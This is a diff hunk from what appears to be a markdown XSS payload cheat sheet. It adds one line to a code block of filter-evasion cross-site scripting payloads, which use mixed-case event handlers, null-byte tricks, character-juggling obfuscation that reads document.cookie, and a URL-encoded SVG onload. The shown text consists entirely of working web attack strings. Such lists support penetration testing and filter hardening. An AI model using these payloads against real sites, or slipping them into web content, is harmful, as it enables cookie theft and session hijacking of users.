@@ -74,7 +74,7 @@ OnMoUsEoVeR=prompt(/hacked/)//
 <<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //
 <noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>">
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
-
+</a<script>alert(document.cookie</script>
 ```
 ## XSS via Reflected Headers
 ```http
